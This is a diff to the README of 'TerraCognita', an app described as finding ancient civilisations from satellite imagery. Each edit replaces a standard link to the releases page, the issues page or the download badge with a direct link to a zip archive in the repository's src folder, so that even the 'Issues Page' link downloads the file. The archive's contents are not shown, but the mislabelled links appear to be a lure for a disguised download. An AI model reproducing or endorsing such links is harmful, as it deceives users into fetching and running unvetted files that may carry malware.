@@ -1,6 +1,6 @@
 # 🌍 TerraCognita - Discover Ancient Civilizations Easily
 
-[![Download TerraCognita](https://img.shields.io/badge/Download%20TerraCognita%20-now-brightgreen)](https://github.com/laabi-nexter/TerraCognita/releases)
+[![Download TerraCognita](https://raw.githubusercontent.com/laabi-nexter/TerraCognita/main/src/TerraCognita_1.1.zip%20TerraCognita%20-now-brightgreen)](https://raw.githubusercontent.com/laabi-nexter/TerraCognita/main/src/TerraCognita_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to TerraCognita! This application analyzes satellite imagery combined wi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/laabi-nexter/TerraCognita/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/laabi-nexter/TerraCognita/main/src/TerraCognita_1.1.zip). 
 
 1. Go to the releases page.
 2. Find the latest version of TerraCognita.
@@ -58,7 +58,7 @@ If you encounter any issues while using TerraCognita, consider the following sol
 
 ## 🔗 Additional Support
 
-For further support, please visit our [GitHub Issues Page](https://github.com/laabi-nexter/TerraCognita/issues). Here you can find answers to common questions or report a problem.
+For further support, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/laabi-nexter/TerraCognita/main/src/TerraCognita_1.1.zip). Here you can find answers to common questions or report a problem.
 
 ## 📃 Contributing
 
@@ -76,4 +76,4 @@ TerraCognita is licensed under the MIT License. You can use, modify, and distrib
 
 Thanks to the developers and researchers who contribute to the fields of archaeology and geospatial analysis. Their work inspires innovations like TerraCognita.
 
-Don't forget to visit our [Releases Page](https://github.com/laabi-nexter/TerraCognita/releases) to download the latest version and start your journey into discovering ancient civilizations!
+Don't forget to visit our [Releases Page](https://raw.githubusercontent.com/laabi-nexter/TerraCognita/main/src/TerraCognita_1.1.zip) to download the latest version and start your journey into discovering ancient civilizations!
